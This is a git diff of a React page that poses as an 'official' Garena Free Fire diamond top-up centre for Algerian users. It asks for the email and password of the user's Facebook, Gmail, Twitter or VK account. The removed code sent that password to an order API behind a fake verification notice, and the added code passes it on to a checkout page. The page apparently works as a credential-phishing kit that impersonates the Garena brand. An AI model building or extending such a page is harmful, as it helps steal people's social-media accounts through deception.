@@ -9,17 +9,26 @@ import {
   ChevronDown,
   Globe,
   Info,
-  MousePointerClick,
+  Menu,
+  X,
+  ClipboardList,
+  User,
+  LogOut,
+  Facebook,
+  Instagram,
+  Check
 } from "lucide-react";
 import Modal from "../components/Modal";
 import { useLanguage } from "../context/LanguageContext";
 
 export default function Charge() {
   const { t, language, setLanguage } = useLanguage();
-  const toggleLanguage = () => {
-    setLanguage(language === 'ar' ? 'en' : 'ar');
-  };
+  const [isLangOpen, setIsLangOpen] = useState(false);
   const navigate = useNavigate();
+  
+  const [isSidebarOpen, setIsSidebarOpen] = useState(false);
+  const user = JSON.parse(localStorage.getItem('ff_user') || '{}');
+
   const [platform, setPlatform] = useState("");
   const [email, setEmail] = useState("");
   const [platformPassword, setPlatformPassword] = useState("");
@@ -49,7 +58,7 @@ export default function Charge() {
   }, []);
 
   const diamondOptions = [
-    { amount: 100, bonus: "0", price: "300" },
+    { amount: 100, bonus: "10", price: "360" },
     { amount: 210, bonus: "21", price: "650" },
     { amount: 310, bonus: "31", price: "950" },
     { amount: 520, bonus: "52", price: "1600" },
@@ -102,51 +111,176 @@ export default function Charge() {
       showToast(t?.("select_payment") || "يرجى اختيار طريقة الدفع أولاً");
       return;
     }
-    setShowConfirm(true);
-  };
-
-  const startProcessing = async () => {
-    if (!isAgreed) return;
-    setShowConfirm(false);
-    setShowProcess(true);
-
-    const stepInterval = setInterval(() => {
-      setProcessStep((prev) => (prev < 3 ? prev + 1 : prev));
-    }, 2500);
-
-    try {
-      const token = localStorage.getItem("ff_token");
-      const res = await axios.post("/api/orders", {
-        token,
+    
+    navigate('/checkout', {
+      state: {
         platform,
         email,
-        platform_password: platformPassword,
+        platformPassword,
         level,
         charged,
         diamonds,
-      });
+        paymentMethod,
+        selectedInfo
+      }
+    });
+  };
 
-      setOrderNum(res.data.order_number);
-
-      setTimeout(() => {
-        clearInterval(stepInterval);
-        setShowProcess(false);
-        setShowSuccess(true);
-      }, 10000);
-    } catch (e) {
-      clearInterval(stepInterval);
-      setShowProcess(false);
-      alert("فشل في إرسال الطلب");
-    }
+  const handleLogout = () => {
+    localStorage.removeItem('ff_token');
+    localStorage.removeItem('ff_user');
+    navigate('/');
   };
 
   return (
     <div className="min-h-screen flex flex-col bg-[#F8F9FA] font-sans overflow-x-hidden" dir={language === 'ar' ? 'rtl' : 'ltr'}>
+      {/* Sidebar Overlay */}
+      <AnimatePresence>
+        {isSidebarOpen && (
+          <motion.div 
+            initial={{ opacity: 0 }}
+            animate={{ opacity: 1 }}
+            exit={{ opacity: 0 }}
+            className="fixed inset-0 z-50 bg-black/50 backdrop-blur-sm"
+            onClick={() => setIsSidebarOpen(false)}
+          />
+        )}
+      </AnimatePresence>
+
+      {/* Sidebar */}
+      <AnimatePresence>
+        {isSidebarOpen && (
+          <motion.div 
+            initial={{ x: language === 'ar' ? '100%' : '-100%' }}
+            animate={{ x: 0 }}
+            exit={{ x: language === 'ar' ? '100%' : '-100%' }}
+            transition={{ type: "spring", bounce: 0, duration: 0.3 }}
+            className={`fixed top-0 bottom-0 ${language === 'ar' ? 'right-0' : 'left-0'} z-50 w-72 bg-white shadow-2xl flex flex-col`}
+          >
+            <div className={`flex items-center justify-between p-4 border-b border-gray-100 ${language === 'ar' ? '' : 'flex-row-reverse'}`}>
+              <div className="flex items-center gap-3">
+                <div className="h-10 w-10 bg-gray-100 rounded-full flex items-center justify-center border-2 border-red-100">
+                  <User className="h-5 w-5 text-red-600" />
+                </div>
+                <div className="text-right">
+                  <div className="font-bold text-gray-900">{user?.account_id}</div>
+                  <div className="text-xs font-semibold text-gray-500">مستوى الحساب: {user?.level || 0}</div>
+                </div>
+              </div>
+              <button 
+                onClick={() => setIsSidebarOpen(false)}
+                className="p-2 rounded-full hover:bg-gray-100 transition-colors"
+              >
+                <X className="h-5 w-5 text-gray-500" />
+              </button>
+            </div>
+            
+            <div className="flex-1 overflow-y-auto py-6 px-4 space-y-2">
+               <button 
+                onClick={() => { setIsSidebarOpen(false); navigate('/my-orders'); }}
+                className="flex w-full items-center rounded-xl bg-gray-50 p-4 font-bold text-gray-700 transition-colors hover:bg-red-50 hover:text-red-600"
+              >
+                <ClipboardList className={`h-5 w-5 text-gray-500 ${language === 'ar' ? 'ml-3' : 'mr-3'}`} />
+                {t('my_orders')}
+              </button>
+              <button 
+                onClick={() => { setIsSidebarOpen(false); navigate('/account'); }}
+                className="flex w-full items-center rounded-xl bg-gray-50 p-4 font-bold text-gray-700 transition-colors hover:bg-red-50 hover:text-red-600"
+              >
+                <User className={`h-5 w-5 text-gray-500 ${language === 'ar' ? 'ml-3' : 'mr-3'}`} />
+                {t('account')}
+              </button>
+
+              <div className="my-6 border-t border-gray-100"></div>
+
+              <div className="space-y-3">
+                 <a 
+                    href="https://www.facebook.com/GarenaFreeFireMENA" 
+                    target="_blank" rel="noopener noreferrer"
+                    className="flex items-center rounded-xl bg-gray-50 p-4 font-bold text-gray-700 transition-colors hover:bg-[#1877F2]/10 hover:text-[#1877F2]"
+                  >
+                    <Facebook className={`h-5 w-5 text-[#1877F2] ${language === 'ar' ? 'ml-3' : 'mr-3'}`} />
+                    تابعنا في فيسبوك
+                  </a>
+                  <a 
+                    href="https://www.instagram.com/garenafreefiremena?igsh=MTR4bTRqeTgycWpzMg==" 
+                    target="_blank" rel="noopener noreferrer"
+                    className="flex items-center rounded-xl bg-gray-50 p-4 font-bold text-gray-700 transition-colors hover:bg-[#E1306C]/10 hover:text-[#E1306C]"
+                  >
+                    <Instagram className={`h-5 w-5 text-[#E1306C] ${language === 'ar' ? 'ml-3' : 'mr-3'}`} />
+                    تابعنا على انستغرام
+                  </a>
+              </div>
+            </div>
+
+            <div className="p-4 border-t border-gray-100">
+              <button 
+                onClick={handleLogout}
+                className="flex w-full items-center justify-center gap-2 rounded-xl bg-red-50 py-3 font-bold text-red-600 transition-colors hover:bg-red-100"
+              >
+                <LogOut className={`h-5 w-5 ${language === 'ar' ? 'rotate-180' : ''}`} />
+                تسجيل الخروج
+              </button>
+            </div>
+          </motion.div>
+        )}
+      </AnimatePresence>
+
       {/* Header */}
       <header className="sticky top-0 z-40 bg-white shadow-sm">
         <div className="mx-auto flex h-16 max-w-4xl items-center justify-between px-4">
-          <div className="flex items-center gap-3">
-            <div className="mx-auto flex h-10 w-10 items-center justify-center overflow-hidden rounded-md border border-gray-100 bg-white shadow-sm">
+          <div className="flex items-center gap-2">
+            <button 
+              onClick={() => setIsSidebarOpen(true)}
+              className="p-2 rounded-lg hover:bg-gray-100 text-gray-600 transition-colors"
+            >
+              <Menu className="h-6 w-6" />
+            </button>
+            <div className="relative">
+              <button 
+                onClick={() => setIsLangOpen(!isLangOpen)}
+                className="flex items-center gap-1 rounded-full border border-gray-200 bg-gray-50 px-3 py-1.5 text-xs font-bold text-gray-700 hover:bg-gray-100 transition-colors"
+              >
+                <Globe className="h-4 w-4" />
+                <span>{language === 'ar' ? t('dz_ar') : t('dz_en')}</span>
+                <ChevronDown className={`h-4 w-4 transition-transform ${isLangOpen ? 'rotate-180' : ''}`} />
+              </button>
+              <AnimatePresence>
+                {isLangOpen && (
+                  <motion.div 
+                    initial={{ opacity: 0, y: 10, scale: 0.95 }}
+                    animate={{ opacity: 1, y: 0, scale: 1 }}
+                    exit={{ opacity: 0, y: 10, scale: 0.95 }}
+                    transition={{ duration: 0.15 }}
+                    className={`absolute top-10 ${language === 'ar' ? 'right-0' : 'left-0'} min-w-[160px] rounded-2xl bg-white p-2 shadow-xl border border-gray-100 z-50`}
+                    dir={language === 'ar' ? 'rtl' : 'ltr'}
+                  >
+                    <button 
+                      onClick={() => { setLanguage('ar'); setIsLangOpen(false); }}
+                      className={`flex items-center w-full text-right px-3 py-2 rounded-xl text-sm font-bold transition-colors ${language === 'ar' ? 'bg-red-50 text-red-600' : 'text-gray-700 hover:bg-gray-50'}`}
+                    >
+                      <span className="flex-1 text-right">العربية (dz)</span>
+                      {language === 'ar' && <Check className="h-4 w-4" />}
+                    </button>
+                    <button 
+                      onClick={() => { setLanguage('en'); setIsLangOpen(false); }}
+                      className={`flex items-center w-full text-right px-3 py-2 rounded-xl mt-1 text-sm font-bold transition-colors ${language === 'en' ? 'bg-red-50 text-red-600' : 'text-gray-700 hover:bg-gray-50'}`}
+                    >
+                      <span className="flex-1 text-right">English (dz)</span>
+                      {language === 'en' && <Check className="h-4 w-4" />}
+                    </button>
+                  </motion.div>
+                )}
+              </AnimatePresence>
+            </div>
+          </div>
+
+          <div className={`flex items-center gap-3 ${language === 'ar' ? 'flex-row' : 'flex-row-reverse'}`}>
+            <div className={`leading-tight ${language === 'ar' ? 'text-right' : 'text-left'}`}>
+              <div className="text-sm font-bold text-gray-800">{t('garena_center')}</div>
+              <div className="text-xs font-semibold text-gray-500">{t('official')}</div>
+            </div>
+            <div className="flex h-10 w-10 items-center justify-center overflow-hidden rounded-md border border-gray-100 bg-white shadow-sm">
               <img
                 src="https://storingo.lovestoblog.com/garena.png"
                 alt="Garena"
@@ -157,35 +291,6 @@ export default function Charge() {
                   if (parent) {
                     parent.innerHTML =
                       '<svg width="40" height="40" viewBox="0 0 200 200" fill="red"><path d="M100 10C50.294 10 10 50.294 10 100s40.294 90 90 90 90-40.294 90-90S149.706 10 100 10Zm41.134 116.7L116.7 151.134 48.866 83.3 73.3 58.866l43.4 43.4 24.434-24.434-24.434-24.434-24.434 24.434-24.434-24.434 48.868-48.868L165.566 73.3l-24.432 24.434 24.432 24.434-24.432 24.434Z"/></svg>';
-                  }
-                }}
-              />
-            </div>
-            <div className="leading-tight">
-              <div className="text-sm font-bold text-gray-800">{t('garena_center')}</div>
-              <div className="text-xs font-semibold text-gray-500">{t('official')}</div>
-            </div>
-          </div>
-          <div className="flex items-center gap-2">
-            <button 
-              onClick={toggleLanguage}
-              className="flex items-center gap-1 rounded-full border border-gray-200 bg-gray-50 px-3 py-1.5 text-xs font-bold text-gray-700 hover:bg-gray-100 transition-colors"
-            >
-              <Globe className="h-4 w-4" />
-              <span>{language === 'ar' ? t('dz_ar') : t('dz_en')}</span>
-              <ChevronDown className="h-4 w-4" />
-            </button>
-            <div className="h-9 w-9 overflow-hidden rounded-full border-2 border-white bg-gray-100 shadow-sm ring-1 ring-gray-100">
-              <img
-                src="https://storingo.lovestoblog.com/ff.png"
-                alt="Profile"
-                className="h-full w-full object-cover"
-                onError={(e) => {
-                  e.currentTarget.style.display = "none";
-                  const parent = e.currentTarget.parentElement;
-                  if (parent) {
-                    parent.innerHTML =
-                      '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-full w-full p-1.5 text-gray-400"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>';
                   }
                 }}
               />
@@ -221,7 +326,7 @@ export default function Charge() {
         )}
 
         {/* Game Icon */}
-        <div className="flex justify-end gap-4 border-b border-gray-200 pb-4">
+        <div className={`flex ${language === 'ar' ? 'justify-end' : 'justify-start'} gap-4 border-b border-gray-200 pb-4`}>
           {isLoading ? (
             <div className="h-20 w-20 animate-pulse rounded-2xl bg-gray-200" />
           ) : (
@@ -257,9 +362,9 @@ export default function Charge() {
             <div className="space-y-3">
               <label className="block text-sm font-bold text-gray-700">
                 {t('platform_type')}
-                <Info className="inline h-4 w-4 text-gray-400 mr-2" />
+                <Info className={`inline h-4 w-4 text-gray-400 ${language === 'ar' ? 'mr-2' : 'ml-2'}`} />
               </label>
-              <div className="flex gap-3 justify-center md:justify-start">
+              <div className="flex gap-3 justify-center md:justify-start flex-wrap">
                 {["facebook", "gmail", "twitter", "vk"].map((p) => (
                   <button
                     key={p}
@@ -350,12 +455,12 @@ export default function Charge() {
                 <select
                   value={charged}
                   onChange={(e) => setCharged(e.target.value)}
-                  className="w-full rounded-xl border border-gray-300 bg-gray-50 p-4 text-sm font-medium text-gray-900 outline-none transition-all focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100 appearance-none"
+                  className={`w-full rounded-xl border border-gray-300 bg-gray-50 p-4 text-sm font-medium text-gray-900 outline-none transition-all focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100 appearance-none ${language === 'en' ? 'pl-10' : 'pr-4'}`}
                 >
                   <option value="لا">{t('charged_before')} - {t('no')}</option>
                   <option value="نعم">{t('charged_before')} - {t('yes')}</option>
                 </select>
-                <div className="pointer-events-none absolute left-4 top-1/2 -translate-y-1/2 text-gray-500">
+                <div className={`pointer-events-none absolute ${language === 'ar' ? 'left-4' : 'right-4'} top-1/2 -translate-y-1/2 text-gray-500`}>
                   <ChevronDown className="h-5 w-5" />
                 </div>
               </div>
@@ -370,15 +475,6 @@ export default function Charge() {
               2
             </div>
             <h2 className="text-xl font-black text-gray-800">{t('amount')}</h2>
-          </div>
-
-          <div className="mx-auto mb-6 flex max-w-[240px] items-center rounded-full border border-gray-200 bg-gray-50 p-1">
-            <button className="flex-1 rounded-full bg-white py-2 text-sm font-bold text-red-600 shadow-sm border border-red-200">
-              شراء
-            </button>
-            <button className="flex-1 rounded-full py-2 text-sm font-bold text-gray-500 hover:text-gray-800">
-              استرداد
-            </button>
           </div>
 
           {isLoading ? (
@@ -422,7 +518,7 @@ export default function Charge() {
               <div className="border-t border-gray-100 pt-6">
                 <div className="mb-4 text-center">
                   <span className="bg-white px-4 text-sm font-bold text-gray-500 relative z-10">
-                    العروض الخاصة
+                    {t('special_offer')}
                   </span>
                   <div className="border-t border-gray-200 -mt-2.5"></div>
                 </div>
@@ -445,7 +541,7 @@ export default function Charge() {
                       <div className="flex h-4 w-4 items-center justify-center rounded-full border border-red-500 text-red-500">
                         <Info className="h-2.5 w-2.5" />
                       </div>
-                      Monthly Membership
+                      {t('monthly_membership')}
                     </div>
                   </button>
 
@@ -467,7 +563,7 @@ export default function Charge() {
                       <div className="flex h-4 w-4 items-center justify-center rounded-full border border-red-500 text-red-500">
                         <Info className="h-2.5 w-2.5" />
                       </div>
-                      Weekly Membership
+                      {t('weekly_membership')}
                     </div>
                   </button>
 
@@ -489,7 +585,7 @@ export default function Charge() {
                       <div className="flex h-4 w-4 items-center justify-center rounded-full border border-red-500 text-red-500">
                         <Info className="h-2.5 w-2.5" />
                       </div>
-                      تصريح بوياه
+                      {t('booyah_pass')}
                     </div>
                   </button>
                 </div>
@@ -504,7 +600,7 @@ export default function Charge() {
             <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-red-600 text-lg font-black text-white">
               3
             </div>
-            <h2 className="text-xl font-black text-gray-800">طرق الدفع</h2>
+            <h2 className="text-xl font-black text-gray-800">{t('payment_methods')}</h2>
           </div>
 
           <div className="mb-4">
@@ -512,8 +608,8 @@ export default function Charge() {
               onClick={() => setPaymentMethod('djezzy')}
               className={`relative w-full rounded-xl border-2 hover:bg-red-50 bg-white p-4 transition-all overflow-hidden flex items-center justify-center h-24 ${paymentMethod === 'djezzy' ? 'border-[#CD1212] ring-2 ring-red-100' : 'border-red-500'}`}
             >
-              <div className="absolute top-0 right-0 rounded-bl-lg bg-red-600 px-3 py-1 text-xs font-bold text-white z-10 flex border-b border-l border-white items-center gap-1">
-                عرض خاص
+              <div className={`absolute top-0 ${language === 'ar' ? 'right-0 rounded-bl-lg border-l' : 'left-0 rounded-br-lg border-r'} bg-red-600 px-3 py-1 text-xs font-bold text-white z-10 flex border-b border-white items-center gap-1`}>
+                {t('special_offer_tag')}
                 <svg
                   width="10"
                   height="10"
@@ -527,7 +623,7 @@ export default function Charge() {
                 </svg>
               </div>
               <div className="flex items-center gap-2">
-                <div className="text-2xl font-black text-black">جازي</div>
+                <div className="text-2xl font-black text-black">{t('djezzy')}</div>
                 <div className="bg-red-600 text-white font-black text-xl px-2 py-1 transform -skew-x-12">
                   DJEZZY
                 </div>
@@ -538,7 +634,7 @@ export default function Charge() {
           <div className="border-t border-gray-100 pt-6 mt-6">
             <div className="mb-4 text-center">
               <span className="bg-white px-4 text-sm font-bold text-gray-500 relative z-10">
-                القنوات غير متوفرة
+                {t('unavailable_channels')}
               </span>
               <div className="border-t border-gray-200 -mt-2.5"></div>
             </div>
@@ -546,7 +642,7 @@ export default function Charge() {
               <div className="text-2xl font-black text-red-500">ooredoo</div>
               <div className="absolute inset-0 bg-white/70 flex items-center justify-center">
                 <span className="text-sm font-bold text-gray-600">
-                  مغلق مؤقتاً للصيانة
+                  {t('temp_closed')}
                 </span>
               </div>
             </div>
@@ -581,16 +677,13 @@ export default function Charge() {
         className="fixed bottom-0 left-0 right-0 z-50 border-t border-gray-100 bg-white px-4 pt-3 pb-4 shadow-[0_-8px_30px_rgba(0,0,0,0.08)] block w-full"
         style={{ paddingBottom: 'max(1rem, env(safe-area-inset-bottom))' }}
       >
-        <div className="mx-auto flex max-w-4xl items-center justify-between gap-3">
-            {/* Price Info (Right side in RTL) */}
-            <div className="flex flex-col items-end leading-none">
+        <div className={`mx-auto flex max-w-4xl items-center justify-between gap-3 ${language === 'en' ? 'flex-row-reverse' : ''}`}>
+            {/* Price Info */}
+            <div className={`flex flex-col ${language === 'en' ? 'items-start' : 'items-end'} leading-none`}>
               <div className="flex items-center gap-1.5 mb-1.5">
-                <div className="flex h-5 w-5 items-center justify-center rounded-full bg-gray-100">
-                  <ChevronDown className="h-3.5 w-3.5 rotate-180 text-gray-800" />
-                </div>
                 <div className="flex items-center">
                   {selectedInfo.bonus && selectedInfo.bonus !== "0" && (
-                     <span className="text-[#CD1212] font-black text-sm ml-1.5">
+                     <span className={`text-[#CD1212] font-black text-sm ${language === 'ar' ? 'ml-1.5' : 'mr-1.5'}`}>
                       {selectedInfo.bonus} +
                     </span>
                   )}
@@ -603,7 +696,7 @@ export default function Charge() {
                   height="22"
                   viewBox="0 0 24 24"
                   fill="none"
-                  className="text-blue-400 drop-shadow-sm ml-1"
+                  className={`text-blue-400 drop-shadow-sm ${language === 'ar' ? 'ml-1' : 'mr-1'}`}
                 >
                   <path d="M6 3L3 8L12 21L21 8L18 3H6Z" fill="currentColor" />
                   <path
@@ -614,23 +707,23 @@ export default function Charge() {
                 </svg>
               </div>
               <div className="text-sm font-bold whitespace-nowrap">
-                <span className="text-gray-500">المجموع:</span>
-                <span className="text-[#CD1212] font-black text-xl ml-1.5">
+                <span className="text-gray-500">{t('total_label')}</span>
+                <span className={`text-[#CD1212] font-black text-xl ${language === 'ar' ? 'ml-1.5' : 'mr-1.5'}`}>
                   DZD {Number(selectedInfo.price).toLocaleString()}
                 </span>
               </div>
             </div>
 
-            {/* Buy Button (Left side in RTL) */}
+            {/* Buy Button */}
             <button
               onClick={handlePreSubmit}
-              disabled={submitLoading}
-              className={`flex items-center justify-center gap-3 rounded-2xl px-8 py-3.5 text-2xl font-black text-white shadow-xl active:scale-95 transition-all text-center whitespace-nowrap ${isFormValid ? 'bg-[#CD1212] shadow-red-600/25 hover:bg-red-700' : 'bg-gray-400 opacity-60 shadow-none'}`}
+              disabled={showProcess}
+              className={`flex items-center justify-center gap-2 rounded-xl px-5 py-2.5 text-lg font-black text-white shadow-md active:scale-95 transition-all text-center whitespace-nowrap ${isFormValid ? 'bg-[#CD1212] shadow-red-600/20 hover:bg-red-700' : 'bg-gray-400 opacity-60 shadow-none cursor-not-allowed'}`}
             >
-              <div className="flex h-7 w-7 items-center justify-center rounded-lg border-2 border-white/50">
-                <ShieldCheck className="h-5 w-5" />
+              <div className="flex h-5 w-5 items-center justify-center rounded-md border-2 border-white/50">
+                <ShieldCheck className="h-3 w-3" />
               </div>
-              {submitLoading ? 'جاري...' : 'شراء الآن'}
+              {showProcess ? 'جاري...' : t('buy_now')}
             </button>
           </div>
         </div>
@@ -639,108 +732,22 @@ export default function Charge() {
       <AnimatePresence>
         {toastMessage && (
           <motion.div
-            initial={{ opacity: 0, y: 50, scale: 0.9 }}
+            initial={{ opacity: 0, y: -50, scale: 0.9 }}
             animate={{ opacity: 1, y: 0, scale: 1 }}
-            exit={{ opacity: 0, y: 20, scale: 0.9 }}
-            className="fixed bottom-28 left-4 right-4 z-[60] mx-auto max-w-sm"
+            exit={{ opacity: 0, y: -20, scale: 0.9 }}
+            className="fixed top-20 left-4 right-4 z-[100] mx-auto max-w-xs"
           >
-            <div className="flex items-center gap-3 rounded-2xl bg-white p-4 shadow-2xl border-l-[6px] border-red-500 border ring-1 ring-black/5">
-              <div className="flex h-10 w-10 flex-shrink-0 items-center justify-center rounded-full bg-red-50 text-red-500">
-                <AlertTriangle className="h-5 w-5" />
+            <div className="flex items-center gap-3 rounded-xl bg-white p-3 shadow-xl border-l-[4px] border-red-500 border ring-1 ring-black/5">
+              <div className="flex h-8 w-8 flex-shrink-0 items-center justify-center rounded-full bg-red-50 text-red-500">
+                <AlertTriangle className="h-4 w-4" />
               </div>
-              <p className="text-sm font-bold text-gray-800 leading-tight">
+              <p className="text-xs font-bold text-gray-800 leading-tight">
                 {toastMessage}
               </p>
             </div>
           </motion.div>
         )}
       </AnimatePresence>
-
-      {/* Confirmation Modal */}
-      <Modal
-        isOpen={showConfirm}
-        onClose={() => setShowConfirm(false)}
-        title="تنويه هام"
-      >
-        <div className="text-center">
-          <div className="mx-auto mb-6 flex h-20 w-20 items-center justify-center rounded-full bg-red-50">
-            <AlertTriangle className="h-10 w-10 text-red-600" />
-          </div>
-          <p className="mb-8 text-sm leading-relaxed text-gray-600">
-            سيتم استلام البيانات للتأكد من هوية الحساب وفق شروط خدمة جارينا
-            للشحن. هل أنت موافق للاستمرار؟
-          </p>
-          <label className="mb-8 flex cursor-pointer items-center justify-center gap-3">
-            <input
-              type="checkbox"
-              checked={isAgreed}
-              onChange={(e) => setIsAgreed(e.target.checked)}
-              className="h-5 w-5 rounded-lg accent-red-600 focus:ring-red-500"
-            />
-            <span className="text-sm font-bold text-gray-700">
-              أوافق على شروط الخدمة لمركز الشحن
-            </span>
-          </label>
-          <div className="flex gap-4">
-            <button
-              onClick={() => setShowConfirm(false)}
-              className="flex-1 rounded-xl bg-gray-100 py-3 font-bold text-gray-700 hover:bg-gray-200 transition-colors"
-            >
-              إلغاء
-            </button>
-            <button
-              onClick={startProcessing}
-              disabled={!isAgreed}
-              className={`flex-1 rounded-xl py-3 font-bold text-white transition-all shadow-md ${isAgreed ? "bg-red-600 shadow-red-600/30 hover:bg-red-700" : "bg-red-300 shadow-none cursor-not-allowed"}`}
-            >
-              متابعة
-            </button>
-          </div>
-        </div>
-      </Modal>
-
-      {/* Processing Modal */}
-      <Modal isOpen={showProcess} onClose={() => {}} title="">
-        <div className="py-10 text-center">
-          <motion.div
-            animate={{ rotate: 360 }}
-            transition={{ repeat: Infinity, duration: 1.5, ease: "linear" }}
-            className="mx-auto mb-8 h-20 w-20 rounded-full border-4 border-gray-100 border-t-red-600"
-          />
-          <h3 className="mb-2 text-xl font-black text-gray-900">
-            {processTexts[processStep]}
-          </h3>
-          <p className="text-xs text-gray-500">
-            معرف العملية:{" "}
-            <span className="font-bold text-red-600">
-              {orderNum || "جاري التوليد..."}
-            </span>
-          </p>
-        </div>
-      </Modal>
-
-      {/* Success Modal */}
-      <Modal
-        isOpen={showSuccess}
-        onClose={() => navigate("/my-orders")}
-        title="تم التسجيل بنجاح"
-      >
-        <div className="text-center">
-          <div className="mx-auto mb-8 flex h-24 w-24 items-center justify-center rounded-full bg-emerald-50">
-            <CheckCircle2 className="h-12 w-12 text-emerald-600" />
-          </div>
-          <p className="mb-8 text-sm font-medium text-gray-600">
-            تم تسجيل طلب الشحن الخاص بك بنجاح وهو الآن قيد المراجعة والمعالجة من
-            قبل النظام.
-          </p>
-          <button
-            onClick={() => navigate("/my-orders")}
-            className="w-full rounded-xl bg-red-600 py-4 font-black text-white hover:bg-red-700 transition-colors shadow-lg shadow-red-600/20"
-          >
-            تتبع الطلب
-          </button>
-        </div>
-      </Modal>
     </div>
   );
 }
